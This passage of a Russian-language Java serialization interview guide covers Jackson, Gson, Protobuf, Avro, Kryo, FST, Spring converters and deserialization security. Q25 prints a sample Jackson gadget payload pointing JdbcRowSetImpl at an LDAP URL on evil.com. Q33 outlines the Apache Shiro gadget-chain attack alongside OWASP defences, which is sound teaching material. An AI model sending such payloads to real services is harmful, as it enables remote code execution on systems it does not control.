        if (x < 0 || y < 0) throw new IllegalArgumentException("negative");
    }
}
```

**Преимущества record для сериализации:**
- Валидация в каноническом конструкторе выполняется и при десериализации (в отличие от обычных классов!)
- Нет проблем с `final` полями
- Фактически record реализует Serialization Proxy Pattern «из коробки»
- Аннотация `@java.io.Serial` (Java 14+) позволяет IDE проверять корректность сигнатур

Это делает `record` **самым безопасным** способом стандартной Java-сериализации.

## Q20. Как работает сериализация с `sealed` классами?

`Sealed`-классы (Java 17+) через `permits` жёстко фиксируют список разрешённых подтипов. Сам механизм сериализации при этом обычный — выигрыш в другом: замкнутость иерархии даёт безопасность и точность фильтрации, потому что множество возможных классов в потоке известно заранее и конечно.

```java
public sealed interface Shape extends Serializable
    permits Circle, Rectangle {
}

public record Circle(double radius) implements Shape {}
public record Rectangle(double width, double height) implements Shape {}
```

**Что это даёт сериализации:**
- Точный белый список для `ObjectInputFilter` — вместо широкого `com.example.*` можно перечислить ровно `permits`-классы
- Компилятор гарантирует, что новый подтип не появится незаметно — список фильтра не «протухнет»
- В связке с `record` — максимум безопасности: `sealed record` и иерархию замыкает, и валидируется через канонический конструктор

**Нюанс JSON.** В бинарном формате тип берётся из самих байтов, а в JSON его нет — поэтому для sealed-иерархии в `Jackson` нужен дискриминатор `@JsonTypeInfo`, иначе десериализатор не поймёт, какой из `permits`-классов создавать.

## Q21. (!) Как работает `Jackson` и его основные аннотации?

`Jackson` — де-факто стандарт JSON-сериализации в Java-экосистеме; встроен в `Spring Boot`, `Quarkus`, `Micronaut`. Вся работа идёт через `ObjectMapper`: он держит конфигурацию и через рефлексию + аннотации маппит поля объекта на ключи JSON в обе стороны. Поведение почти не настраивают кодом — его задают аннотациями прямо на DTO.

```java
ObjectMapper mapper = new ObjectMapper();

// Сериализация
String json = mapper.writeValueAsString(user);

// Десериализация
User user = mapper.readValue(json, User.class);
```

Ключевые аннотации:

| Аннотация | Назначение |
|-----------|-----------|
| `@JsonProperty("name")` | Задаёт имя поля в JSON |
| `@JsonIgnore` | Исключить поле |
| `@JsonIgnoreProperties` | Игнорировать неизвестные поля |
| `@JsonInclude(NON_NULL)` | Не включать null-поля |
| `@JsonCreator` | Пометить конструктор/фабричный метод для десериализации |
| `@JsonFormat` | Формат даты/числа |
| `@JsonSerialize` / `@JsonDeserialize` | Кастомные сериализаторы |
| `@JsonTypeInfo` | Полиморфная десериализация |
| `@JsonSubTypes` | Перечисление подтипов |

```java
@JsonIgnoreProperties(ignoreUnknown = true)
public class UserDto {
    @JsonProperty("user_name")
    private String name;

    @JsonFormat(pattern = "yyyy-MM-dd")
    private LocalDate birthDate;

    @JsonInclude(JsonInclude.Include.NON_NULL)
    private String middleName;

    @JsonCreator
    public UserDto(@JsonProperty("user_name") String name) {
        this.name = Objects.requireNonNull(name);
    }
}
```

## Q22. Чем `Jackson` отличается от `Gson`?

| Характеристика | `Jackson` | `Gson` |
|----------------|-----------|--------|
| Производительность | Быстрее (потоковый парсинг) | Медленнее |
| Экосистема | Огромная (XML, YAML, CBOR, Avro...) | Только JSON |
| Spring Boot | Встроен по умолчанию | Нужно подключать |
| Аннотации | Богатый набор (`@JsonTypeInfo`, `@JsonView`...) | Минимальный |
| Immutable объекты | `@JsonCreator` + `@JsonProperty` | Требует `TypeAdapter` |
| `record` поддержка | Полная (с 2.12+) | Ограниченная |
| Размер | ~1.7 MB (core + annotations + databind) | ~250 KB |
| Обработка дженериков | `TypeReference<List<User>>()` | `TypeToken<List<User>>()` |
| Null handling | Гибкий (`@JsonInclude`) | `serializeNulls()` |

Если коротко: `Jackson` — мощный «комбайн» для backend, `Gson` — лёгкий и простой инструмент строго под JSON.

```java
// Jackson
ObjectMapper mapper = new ObjectMapper();
List<User> users = mapper.readValue(json, new TypeReference<List<User>>() {});

// Gson
Gson gson = new Gson();
List<User> users = gson.fromJson(json, new TypeToken<List<User>>() {}.getType());
```

**Когда выбрать `Gson`:** маленький проект без Spring, нужна простая JSON-сериализация, важен размер зависимости (мобильные приложения, Android).

**Когда выбрать `Jackson`:** Spring Boot проект, нужна работа с XML/YAML, полиморфизм, streaming API, высокая производительность.

## Q23. Как обрабатывать полиморфизм при JSON-сериализации в `Jackson`?

Проблема полиморфизма в том, что JSON — это просто набор полей без типа: по `{"radius": 5}` десериализатор не знает, что создавать — `Circle` или `Rectangle`. Решение — записать тип в сам JSON через `@JsonTypeInfo` + `@JsonSubTypes`, чтобы при чтении было ясно, какой подкласс инстанцировать.

```java
@JsonTypeInfo(
    use = JsonTypeInfo.Id.NAME,
    include = JsonTypeInfo.As.PROPERTY,
    property = "type"
)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Circle.class, name = "circle"),
    @JsonSubTypes.Type(value = Rectangle.class, name = "rectangle")
})
public abstract class Shape {
    public abstract double area();
}

public class Circle extends Shape {
    public double radius;
    public double area() { return Math.PI * radius * radius; }
}

public class Rectangle extends Shape {
    public double width, height;
    public double area() { return width * height; }
}
```

Результат JSON:
```json
{"type": "circle", "radius": 5.0}
{"type": "rectangle", "width": 3.0, "height": 4.0}
```

Стратегии включения типа (`JsonTypeInfo.As`):
- `PROPERTY` — отдельное поле в JSON (`"type": "circle"`)
- `WRAPPER_OBJECT` — объект обёрнут: `{"circle": {"radius": 5}}`
- `WRAPPER_ARRAY` — массив: `["circle", {"radius": 5}]`
- `EXISTING_PROPERTY` — использовать существующее поле класса

## Q24. Как настроить кастомный сериализатор/десериализатор в `Jackson`?

Когда аннотаций мало (нестандартный формат, объект из чужой библиотеки, особая логика чтения), пишут свой `JsonSerializer`/`JsonDeserializer` — они дают полный контроль над тем, как тип превращается в JSON и обратно. Подключить их можно двумя способами: аннотацией `@JsonSerialize`/`@JsonDeserialize` на классе (если класс ваш) или регистрацией через `SimpleModule` (если класс чужой и аннотацию не повесить).

```java
// Кастомный сериализатор
public class MoneySerializer extends JsonSerializer<Money> {
    @Override
    public void serialize(Money value, JsonGenerator gen,
                          SerializerProvider provider) throws IOException {
        gen.writeStartObject();
        gen.writeNumberField("amount", value.getAmount());
        gen.writeStringField("currency", value.getCurrency().getCurrencyCode());
        gen.writeEndObject();
    }
}

// Кастомный десериализатор
public class MoneyDeserializer extends JsonDeserializer<Money> {
    @Override
    public Money deserialize(JsonParser p, DeserializationContext ctx)
            throws IOException {
        JsonNode node = p.getCodec().readTree(p);
        BigDecimal amount = node.get("amount").decimalValue();
        String currency = node.get("currency").asText();
        return Money.of(amount, currency);
    }
}

// Регистрация
@JsonSerialize(using = MoneySerializer.class)
@JsonDeserialize(using = MoneyDeserializer.class)
public class Money { /* ... */ }

// Или через модуль
SimpleModule module = new SimpleModule();
module.addSerializer(Money.class, new MoneySerializer());
module.addDeserializer(Money.class, new MoneyDeserializer());
mapper.registerModule(module);
```

## Q25. Какие проблемы безопасности есть у JSON-десериализации?

JSON-десериализация заметно безопаснее Java Serialization (нет произвольного `readObject`), но не безопасна абсолютно — риски возникают там, где десериализатору позволяют выбирать класс по данным из потока.

**1. Полиморфная десериализация в `Jackson`.** Если включён `DefaultTyping` или стоит `@JsonTypeInfo` с неограниченным `JsonTypeInfo.Id.CLASS`, имя класса берётся прямо из JSON — и атакующий подставляет туда опасный класс, превращая JSON-парсинг в тот же вектор атаки, что и бинарная сериализация:

```json
{"@class": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://evil.com/exploit"}
```

Именно поэтому в `Jackson` 2.10+ `DefaultTyping` выключен по умолчанию, а при включении требует `PolymorphicTypeValidator` — белый список разрешённых пакетов/типов:

```java
ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(
        BasicPolymorphicTypeValidator.builder()
            .allowIfSubType("com.example.dto")
            .build(),
        DefaultTyping.NON_FINAL
    )
    .build();
```

**2. Denial of Service.** Глубоко вложенный JSON может рекурсией уронить парсер в `StackOverflowError`. Ограничить глубину и размер можно через `mapper.getFactory().setStreamReadConstraints(...)`.

**3. Billion Laughs** (XML Entity Expansion) — атака разрастания сущностей; касается XML-парсеров, но `Jackson` XML по умолчанию от неё защищён.

## Q26. (!) Что такое `Protocol Buffers` и когда их использовать?

`Protocol Buffers` (`Protobuf`) — компактный бинарный формат от Google со строго заданной схемой. Контракт описывают в `.proto`-файле, а кодогенератор делает из него классы для нужного языка. Ключевая идея — поля идентифицируются **числовыми тегами**, а не именами: имя поля в байты не попадает, поэтому формат маленький, а переименование поля совместимости не ломает (важен номер, не имя).

```protobuf
syntax = "proto3";

message User {
  string name = 1;    // числовые теги, а не имена
  int32 age = 2;
  repeated string roles = 3;

  enum Status {
    ACTIVE = 0;
    INACTIVE = 1;
  }
  Status status = 4;
}
```

```java
// Сгенерированный код (автоматически)
User user = User.newBuilder()
    .setName("Alice")
    .setAge(30)
    .addRoles("admin")
    .setStatus(User.Status.ACTIVE)
    .build();

byte[] bytes = user.toByteArray();         // сериализация
User parsed = User.parseFrom(bytes);       // десериализация
```

| Характеристика | Protobuf | Java Serialization | JSON |
|----------------|----------|-------------------|------|
| Размер | Очень маленький | Большой | Средний |
| Скорость | Очень быстрая | Медленная | Средняя |
| Межъязыковость | Да (10+ языков) | Нет (только JVM) | Да |
| Человекочитаемость | Нет | Нет | Да |
| Схема | Обязательна (.proto) | Нет (класс = схема) | Опциональна (JSON Schema) |
| Эволюция | Отличная (backward/forward) | Плохая | Средняя |

Используется в [Kafka](../../messaging/kafka-interview.md), `gRPC`, внутренних API между микросервисами.

## Q27. Что такое `Apache Avro` и чем он отличается от `Protobuf`?

`Apache Avro` — бинарный формат, заточенный под `Hadoop`-экосистему и потоковую обработку. Главное отличие от `Protobuf` — **схема едет вместе с данными** (или берётся из Schema Registry). Из-за этого Avro не требует обязательной кодогенерации: читать данные можно динамически, зная схему, и поля не нужно метить тегами — порядок и типы задаёт сама схема.

```json
{
  "type": "record",
  "name": "User",
  "fields": [
    {"name": "name", "type": "string"},
    {"name": "age", "type": "int"},
    {"name": "email", "type": ["null", "string"], "default": null}
  ]
}
```

| Характеристика | Avro | Protobuf |
|----------------|------|----------|
| Схема | JSON, хранится с данными | `.proto`, нужна обоим сторонам |
| Кодогенерация | Опциональна (динамическая схема) | Обязательна |
| Эволюция схемы | Reader/Writer schema negotiation | Backward/Forward compatible |
| Экосистема | Hadoop, Kafka, Schema Registry | gRPC, Google Cloud |
| Размер сообщения | Компактный (без тегов полей) | Компактный (с тегами) |
| Лучший сценарий | Потоковая обработка, Data Lake | RPC, API между сервисами |

`Avro` особенно популярен в связке с `Confluent Schema Registry` и [Apache Kafka](../../messaging/kafka-interview.md) для эволюции схем событий.

## Q28. Что такое `Kryo` и когда его выбирают?

`Kryo` — очень быстрая бинарная библиотека сериализации для JVM. В отличие от стандартного механизма, ей не нужен `Serializable` — она сериализует любой POJO через рефлексию. Платой за скорость и компактность становится привязка к JVM и отсутствие явной схемы: формат оптимизирован под «JVM пишет — JVM читает», а не под внешние контракты.

```java
Kryo kryo = new Kryo();
kryo.register(User.class); // регистрация для компактности

// Запись
Output output = new Output(new FileOutputStream("data.kryo"));
kryo.writeObject(output, user);
output.close();

// Чтение
Input input = new Input(new FileInputStream("data.kryo"));
User user = kryo.readObject(input, User.class);
input.close();
```

**Плюсы:**
- Очень быстрая — в 5–10× быстрее Java Serialization
- Компактный формат
- Не требует `Serializable` — работает с любым POJO
- Проверена на нагрузке: используется в `Apache Spark`, `Flink`, `Akka`

**Ограничения:**
- Привязана к JVM — межъязыковой совместимости нет
- Экземпляр `Kryo` не thread-safe — нужен `ThreadLocal<Kryo>` или пул
- Нет явной схемы — изменение класса легко ломает чтение старых данных
- Не годится для внешних API и долгого хранения

**Сценарий применения:** внутренний обмен между JVM-процессами, кэширование, распределённые вычисления — там, где обе стороны под вашим контролем и важна скорость.

## Q29. (!) Как выбрать формат сериализации для проекта?

Выбор сводится к нескольким развилкам: нужен ли межъязыковой обмен, важна ли человекочитаемость, критична ли скорость и есть ли Schema Registry. Цепочка вопросов ниже ведёт к конкретному формату; таблица показывает, какой формат уместен в каждом типичном сценарии. Универсального ответа нет — выбирают под задачу, а не «по умолчанию».

Дерево выбора («Какой формат?»):

- **Межъязыковой обмен нужен?**
  - **Да** → **Человекочитаемый формат нужен?**
    - **Да** → `JSON` (`Jackson`).
    - **Нет** → **Есть Schema Registry?**
      - **Да** → `Avro`.
      - **Нет** → `Protobuf`.
  - **Нет, только JVM** → **Нужна максимальная скорость?**
    - **Да** → `Kryo`.
    - **Нет** → **Достаточно стандартного JDK?**
      - **Да** → `Java Serialization` (обязательно с фильтрами).
      - **Нет** → `Kryo`.

| Критерий | JSON | Protobuf | Avro | Kryo | Java Ser. |
|----------|------|----------|------|------|-----------|
| REST API | ✅ | ❌ | ❌ | ❌ | ❌ |
| gRPC | ❌ | ✅ | ❌ | ❌ | ❌ |
| Kafka events | ⚠️ | ✅ | ✅ | ❌ | ❌ |
| Кэш (Redis) | ✅ | ✅ | ❌ | ✅ | ⚠️ |
| Spark/Flink | ❌ | ❌ | ✅ | ✅ | ❌ |
| RMI | ❌ | ❌ | ❌ | ❌ | ✅ |
| Отладка | ✅ | ❌ | ❌ | ❌ | ❌ |

## Q30. (!) Почему в микросервисах обычно избегают `Java Serialization`?

Микросервисы строятся на независимом деплое и языковой неоднородности — а Java Serialization противоречит обоим принципам. Конкретно:

1. **Сильная связность** — обе стороны должны иметь идентичные версии классов; при rolling deploy старая и новая версии оказываются несовместимы
2. **Привязка к JVM** — сервис на `Python`, `Go` или `Node.js` такой поток просто не прочитает
3. **Безопасность** — gadget chains делают приём недоверенных данных крайне опасным (см. Q16)
4. **Наблюдаемость** — бинарь нечитаем: его не залогировать и не посмотреть в инструментах мониторинга
5. **Производительность** — парадоксально, но из-за рефлексии и метаданных это медленнее большинства альтернатив
6. **Эволюция контрактов** — нет версионирования схем и Schema Registry, контракт меняется «вслепую»

Например, два сервиса: `Service A` (Java 17, `User v2`) и `Service B` (Java 11, `User v1`):

- через `Java Serialization` обмен ломается — `User v1` ≠ `User v2`;
- через `Protobuf`/`JSON` обмен работает за счёт совместимых схем.

В микросервисах используют: `JSON` (для REST API), `Protobuf` (для gRPC), `Avro` (для event streaming с [Kafka](../../messaging/kafka-interview.md)). Подробнее о сериализации в контексте обмена сообщениями: [Apache Kafka](../../messaging/kafka-interview.md).

## Q31. Как организовать версионирование схем в микросервисной архитектуре?

Цель версионирования — менять контракт так, чтобы старые и новые сервисы продолжали понимать друг друга во время постепенного выката. Каждый формат решает это по-своему:

**1. Protobuf — версионирование через правила совместимости:**
```protobuf
message User {
  string name = 1;
  int32 age = 2;
  // v2: добавлено новое поле (backward compatible)
  string email = 3;
  // НЕЛЬЗЯ: менять тип поля, переиспользовать удалённые номера
  reserved 5, 6;        // зарезервировать удалённые номера
  reserved "old_field"; // зарезервировать удалённые имена
}
```

**2. Avro + Schema Registry:**
```
Producer → Schema Registry → Consumer
   ↓            ↓               ↓
 Writer      Хранение        Reader
 Schema      + проверка       Schema
             совместимости
```

Режимы совместимости в Schema Registry:
- **BACKWARD** — новый код читает старые данные (добавление полей с default)
- **FORWARD** — старый код читает новые данные (удаление полей с default)
- **FULL** — оба направления
- **NONE** — без проверок (опасно)

**3. JSON — версионирование через URL или заголовки:**
```
GET /api/v1/users   → UserDto v1
GET /api/v2/users   → UserDto v2
Accept: application/vnd.api.v2+json
```

## Q32. Как сериализация связана с паттернами обмена сообщениями?

Выбор формата — не деталь, а архитектурное решение: в messaging-системах от него зависит, переживёт ли система эволюцию схем. По паттернам это видно особенно ясно:

- **Event Sourcing** — события хранятся вечно и должны читаться годы спустя, поэтому критична forward/backward-совместимость. Лучший выбор — `Avro` с Schema Registry или `Protobuf` с `reserved`-полями.
- **CQRS** — у команд и запросов разные требования, поэтому форматы можно разделить: `JSON` для REST-команд, `Protobuf` для внутренних событий.
- **Saga Pattern** — компенсирующие транзакции опираются на надёжную десериализацию сообщений между сервисами; несовместимость схем способна «подвесить» сагу на середине.

Выбор формата по паттерну (паттерн → формат → что он даёт):

- `REST API` → `JSON` → human-readable;
- `gRPC` → `Protobuf` → типизированный контракт;
- `Event Streaming` → `Avro` → эволюция схем;
- `Internal Cache` → `Kryo` → максимальная скорость;
- `Legacy RMI` → `Java Ser.` → кандидат на миграцию.

Подробнее о [паттернах обмена сообщениями в Kafka](../../messaging/kafka-interview.md) и [паттернах проектирования](../../design-patterns/design-patterns-interview.md).

## Q33. (!) Десериализация как вектор атаки — OWASP и реальные эксплойты

Небезопасная десериализация — признанная критическая уязвимость: в **OWASP Top 10** она была отдельным пунктом A8:2017 (Insecure Deserialization), а в редакции 2021 вошла в A08:2021 — Software and Data Integrity Failures.

**Почему Java Serialization опаснее прочих форматов:**

1. JVM исполняет код прямо в процессе чтения — срабатывают `readObject`, статические инициализаторы, конструкторы
2. В classpath типичного enterprise-приложения (Spring, Hibernate) уже лежат **gadget-классы** с опасными `readObject` — арсенал для атаки готов
3. Атакующему не нужен секрет: достаточно подменить сериализованный поток на входе

**Реальные уязвимости:**

| CVE | Продукт | Эксплойт |
|-----|---------|---------|
| CVE-2015-4852 | Oracle WebLogic | Apache Commons Collections gadget chain — RCE |
| CVE-2016-0792 | Jenkins | RCE через сериализованный объект в API |
| CVE-2016-4437 | Apache Shiro | RememberMe cookie — Base64+шифрование+Java Ser. = RCE |
| CVE-2017-7525 | Jackson | `enableDefaultTyping` + `JdbcRowSetImpl` = SSRF/RCE |

**Apache Shiro — показательный пример:**

```
Атакующий
  → модифицирует RememberMe cookie (Base64 → AES-CBC → Java Serialization)
  → сервер десериализует без проверки
  → гаджет-цепочка Commons Collections выполняет произвольную команду
```

**Защита согласно OWASP:**
1. Не десериализовать данные из ненадёжных источников
2. Подписывать сериализованные данные (HMAC) — проверять до десериализации
3. `ObjectInputFilter` — белый список классов
4. Изолировать десериализацию в отдельном процессе с минимальными правами
5. Логировать все попытки десериализации (Java Flight Recorder, `java.io.serialization` event)
6. Удалять из classpath известные gadget-библиотеки старых версий

```java
// Проверка подписи ДО десериализации
byte[] data = receiveData();
byte[] signature = receiveSignature();

// Верифицировать HMAC-SHA256
if (!verifyHmac(data, signature, secretKey)) {
    throw new SecurityException("Invalid signature — possible tampering");
}

// Только после успешной проверки — десериализация с фильтром
try (var ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
    ois.setObjectInputFilter(myAllowList);
    return (MyDto) ois.readObject();
}
```

## Q34. (!) Как `readResolve()` обеспечивает Singleton при десериализации?

Десериализация всегда **создаёт новый объект** в обход приватного конструктора — а Singleton как раз держится на том, что конструктор приватный и экземпляр один. Поэтому наивный сериализуемый Singleton после round-trip даёт второй экземпляр и инвариант ломается:

```java
// Сломанный Singleton
public class BrokenSingleton implements Serializable {
    private static final BrokenSingleton INSTANCE = new BrokenSingleton();
    private BrokenSingleton() {}
    public static BrokenSingleton getInstance() { return INSTANCE; }
}

// После сериализации/десериализации — два разных объекта!
BrokenSingleton s1 = BrokenSingleton.getInstance();
byte[] bytes = serialize(s1);
BrokenSingleton s2 = deserialize(bytes);
System.out.println(s1 == s2); // false! Singleton нарушен
```

**Решение — `readResolve()`.** JVM вызывает его сразу после десериализации и подставляет то, что он вернёт; лишний экземпляр уходит в мусор. Возвращаем из него единственный `INSTANCE` — и Singleton снова цел:

```java
public class Singleton implements Serializable {
    private static final long serialVersionUID = 1L;
    private static final Singleton INSTANCE = new Singleton();

    private Singleton() {}

    public static Singleton getInstance() { return INSTANCE; }

    // Вызывается ПОСЛЕ десериализации — возвращаем единственный экземпляр
    @java.io.Serial
    private Object readResolve() {
        return INSTANCE; // десериализованный объект будет собран GC
    }
}

// Теперь Singleton работает корректно
Singleton s1 = Singleton.getInstance();
Singleton s2 = deserialize(serialize(s1));
System.out.println(s1 == s2); // true!
```

**Аналог `writeReplace()`:** позволяет заменить объект перед сериализацией — используется в Serialization Proxy Pattern:

```java
private Object writeReplace() {
    return new SerializationProxy(this); // сериализуем прокси вместо себя
}
```

**Лучшая альтернатива для Singleton** — использовать `enum`:

```java
public enum EnumSingleton {
    INSTANCE;
    // enum гарантированно защищён от дублирования при десериализации!
}
```

JVM гарантирует, что `enum`-константы десериализуются в единственный экземпляр — без `readResolve()`.

## Q35. Что такое `serialPersistentFields` и когда его использовать?

`serialPersistentFields` объявляет сериализованную форму класса как явный контракт — список «виртуальных» полей с именами и типами, отвязанный от реальных полей. По умолчанию сериализованный формат определяется именами полей класса, поэтому переименование поля ломает совместимость. `serialPersistentFields` разрывает эту связь: формат остаётся стабильным, а физические поля можно переименовывать и рефакторить, лишь бы `writeObject`/`readObject` правильно мапили их на имена из контракта.

```java
public class FlexibleClass implements Serializable {
    // Список сериализуемых "виртуальных" полей
    @java.io.Serial
    private static final ObjectStreamField[] serialPersistentFields = {
        new ObjectStreamField("name", String.class),
        new ObjectStreamField("age", int.class),
        new ObjectStreamField("email", String.class)
    };

    // Реальные поля могут отличаться!
    private String fullName;  // "name" в сериализованной форме
    private int yearsOld;     // "age" в сериализованной форме
    private String contactEmail;

    @java.io.Serial
    private void writeObject(ObjectOutputStream out) throws IOException {
        ObjectOutputStream.PutField fields = out.putFields();
        fields.put("name", fullName);
        fields.put("age", yearsOld);
        fields.put("email", contactEmail);
        out.writeFields();
    }

    @java.io.Serial
    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField fields = in.readFields();
        fullName = (String) fields.get("name", null);
        yearsOld = fields.get("age", 0);
        contactEmail = (String) fields.get("email", null);
    }
}
```

**Когда применять:**
- При рефакторинге полей класса без потери обратной совместимости (можно переименовать поля, не меняя сериализованный формат)
- Для маппинга между логическими именами формата и физическими именами полей
- При реализации строгого контракта сериализованной формы (защита от случайного изменения)

**Важно:** `serialPersistentFields` должно быть `private static final` с точно таким именем — иначе JVM игнорирует его.

## Q36. Как сериализация работает с наследованием и `abstract class`?

Поведение зависит от того, где в иерархии стоит `Serializable`. Главное правило простое: поля сериализуются ровно до того уровня иерархии, который сериализуем, а всё, что выше несериализуемого предка, восстанавливается через его no-arg конструктор. Разберём три типичных случая.

**1. Родительский класс `Serializable` — все подклассы тоже `Serializable`:**

```java
// Serializable распространяется на подклассы
public class Animal implements Serializable {
    private String name;
}

public class Dog extends Animal {
    private String breed;
    // Dog автоматически Serializable, breed тоже сериализуется
}
```

**2. Родительский класс НЕ `Serializable`:**

```java
public class Base { // не Serializable
    private int baseField = 42; // НЕ сериализуется
    // ОБЯЗАТЕЛЬНО нужен конструктор по умолчанию!
    public Base() { baseField = 0; } // вызовется при десериализации Child
}

public class Child extends Base implements Serializable {
    private int childField = 10; // сериализуется

    // При десериализации:
    // 1. Вызывается Base() — baseField = 0 (не восстанавливается из потока!)
    // 2. childField восстанавливается из потока = 10
}
```

**3. Abstract class и сериализация:**

```java
// Абстрактный класс может быть Serializable
public abstract class AbstractEntity implements Serializable {
    private static final long serialVersionUID = 1L;
    private Long id;

    // serialVersionUID определяется иерархией отдельно для каждого класса
}

public class UserEntity extends AbstractEntity {
    private static final long serialVersionUID = 2L; // свой UID!
    private String username;
}
```

**Правила для безопасной сериализации иерархий:**

| Ситуация | Что происходит | Что нужно |
|----------|----------------|-----------|
| Parent `Serializable`, Child нет | Child тоже сериализуется | Пометить нужные поля `transient` |
| Parent не `Serializable` | Поля Parent не сериализуются | Parent обязан иметь `public`/`protected` no-arg конструктор |
| Abstract class `Serializable` | Все конкретные подклассы сериализуются | Каждый класс должен иметь свой `serialVersionUID` |
| Интерфейс `Serializable` | Все реализации должны поддерживать сериализацию | Документировать контракт |

## Q37. (!) Как Spring обрабатывает сериализацию через `HttpMessageConverter`?

`HttpMessageConverter` — абстракция Spring MVC и WebFlux, превращающая объект в тело HTTP-ответа и парсящая тело запроса обратно в объект. Когда вы возвращаете DTO из `@RestController`, Spring сам подбирает подходящий конвертер по заголовку `Content-Type`/`Accept` и через него выполняет сериализацию. То есть в REST-приложении сериализацией занимаются именно конвертеры, а не вы напрямую.

Поток в обе стороны через `HttpMessageConverter`:

- на выходе: `Java Object` → (`write`) → `HttpMessageConverter` → (`serialize`) → `HTTP Body`;
- на входе: `HTTP Body` → (`deserialize`) → `HttpMessageConverter` → (`read`) → `Java Object`.

**Основные конвертеры:**

| Конвертер | Media Type | Описание |
|-----------|-----------|---------|
| `MappingJackson2HttpMessageConverter` | `application/json` | Jackson ObjectMapper (по умолчанию) |
| `GsonHttpMessageConverter` | `application/json` | Gson (нужно подключать) |
| `StringHttpMessageConverter` | `text/plain`, `text/*` | Строки без преобразования |
| `ByteArrayHttpMessageConverter` | `application/octet-stream` | Сырые байты |
| `MappingJackson2XmlHttpMessageConverter` | `application/xml` | Jackson XML |
| `ProtobufHttpMessageConverter` | `application/x-protobuf` | Protocol Buffers |
| `FormHttpMessageConverter` | `application/x-www-form-urlencoded` | HTML-формы |

**Настройка Jackson через Spring Boot:**

```java
@Configuration
public class JacksonConfig {

    @Bean
    public Jackson2ObjectMapperBuilderCustomizer customizer() {
        return builder -> builder
            .featuresToDisable(
                SerializationFeature.WRITE_DATES_AS_TIMESTAMPS,
                DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES
            )
            .featuresToEnable(MapperFeature.DEFAULT_VIEW_INCLUSION)
            .modules(new JavaTimeModule())
            .serializationInclusion(JsonInclude.Include.NON_NULL);
    }
}
```

**Content Negotiation — выбор конвертера по `Accept` заголовку:**

```java
@GetMapping(value = "/users/{id}", produces = {
    MediaType.APPLICATION_JSON_VALUE,
    MediaType.APPLICATION_XML_VALUE,
    "application/x-protobuf"
})
public UserDto getUser(@PathVariable Long id) {
    return userService.findById(id);
    // Spring выберет конвертер по Accept-заголовку клиента
}
```

**Кастомный `HttpMessageConverter`:**

```java
@Bean
public HttpMessageConverter<MyFormat> myConverter() {
    return new AbstractHttpMessageConverter<>(MediaType.parseMediaType("application/x-myformat")) {
        @Override
        protected boolean supports(Class<?> clazz) { return MyFormat.class.isAssignableFrom(clazz); }

        @Override
        protected MyFormat readInternal(Class<? extends MyFormat> clazz, HttpInputMessage msg) throws IOException {
            return MyFormat.parse(msg.getBody());
        }

        @Override
        protected void writeInternal(MyFormat t, HttpOutputMessage msg) throws IOException {
            t.writeTo(msg.getBody());
        }
    };
}
```

## Q38. (!) Jackson vs Gson — углублённое сравнение для Spring-проектов

Базовое сравнение уже в Q22. Здесь — детали, критичные для production Spring-проектов:

**Поддержка Java современных конструкций:**

```java
// Jackson 2.12+ — полная поддержка record
public record UserDto(String name, int age) {}

ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(new UserDto("Alice", 30));
// {"name":"Alice","age":30}
UserDto user = mapper.readValue(json, UserDto.class);
// Работает через конструктор record

// Gson с record — ограничения
Gson gson = new Gson();
// До Gson 2.10 - не работал с record компонентами (использовал рефлексию полей)
// С Gson 2.10+ - базовая поддержка
```

**Производительность потоковой обработки:**

```java
// Jackson Streaming API — минимальный overhead
try (JsonParser parser = mapper.getFactory().createParser(json)) {
    while (parser.nextToken() != JsonToken.END_OBJECT) {
        String fieldName = parser.getCurrentName();
        // Обработка без создания промежуточных объектов
    }
}

// Gson не имеет аналогичного low-level API такой же мощности
```

**Обработка null и defaults:**

```java
// Jackson — гибкая настройка
@JsonInclude(JsonInclude.Include.NON_NULL)         // пропустить null
@JsonInclude(JsonInclude.Include.NON_EMPTY)         // пропустить null и пустые
@JsonInclude(JsonInclude.Include.NON_DEFAULT)       // пропустить значения по умолчанию

// Gson — глобально или через TypeAdapter
Gson gson = new GsonBuilder()
    .serializeNulls()   // включить сериализацию null (по умолчанию выключено)
    .create();
```

**Рекомендация для Spring Boot:**
- По умолчанию — Jackson: он уже в `spring-boot-starter-web`, дополнительных зависимостей не нужно, а интеграция (конвертеры, поддержка `record`) идёт из коробки
- Gson — оправдан, только если у команды есть сильная экспертиза по нему или проект не на Spring Boot
- Для Android — Gson предпочтительнее из-за меньшего размера зависимости

## Q39. FST — быстрый аналог Java Serialization

**FST** (Fast Serialization) — библиотека, совместимая с Java Serialization API, но в разы быстрее стандартной реализации. Её фишка — почти drop-in замена: классы остаются `Serializable`, рефакторить ничего не нужно, вы лишь меняете точку вызова. Это и есть её ниша: ускорить legacy-код, не переписывая модель под `Protobuf` или `Kryo`.

```xml
<dependency>
    <groupId>de.ruedigermoeller</groupId>
    <artifactId>fst</artifactId>
    <version>2.57</version>
</dependency>
```

```java
// Использование FST
FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration();
conf.registerClass(User.class); // опционально — ускоряет

// Сериализация
byte[] bytes = conf.asByteArray(user);

// Десериализация
User restored = (User) conf.asObject(bytes);
```

**Сравнение с Kryo и стандартной сериализацией:**

| Характеристика | Java Serialization | FST | Kryo |
|----------------|-------------------|-----|------|
| Требует `Serializable` | Да | Да (совместимость) | Нет |
| Скорость | 1x (baseline) | ~4-10x быстрее | ~5-10x быстрее |
| Размер | Большой | Меньше | Меньший |
| Thread-safe | Да | Конфигурация shared, экземпляры нет | Нет |
| Межъязыковость | Нет | Нет | Нет |
| Drop-in замена | — | Почти да | Нет |

**Преимущество FST перед Kryo:** обратная совместимость с `Serializable` — можно использовать как drop-in замену в legacy-коде без рефакторинга классов.

**Ограничения FST:**
- Привязан к JVM
- Библиотека менее активно развивается (последний релиз — 2021)
- Не подходит для межъязыковой коммуникации
- Нет официальной поддержки Java record и sealed classes

**Типичный use case:** кэширование объектов в Redis внутри JVM-приложения, где нужна скорость, но классы уже `Serializable`.

## Q40. Как сериализуются `Java Record` — детали механизма

Это углубление Q19 — про внутренний механизм и почему `record` безопаснее обычного класса.

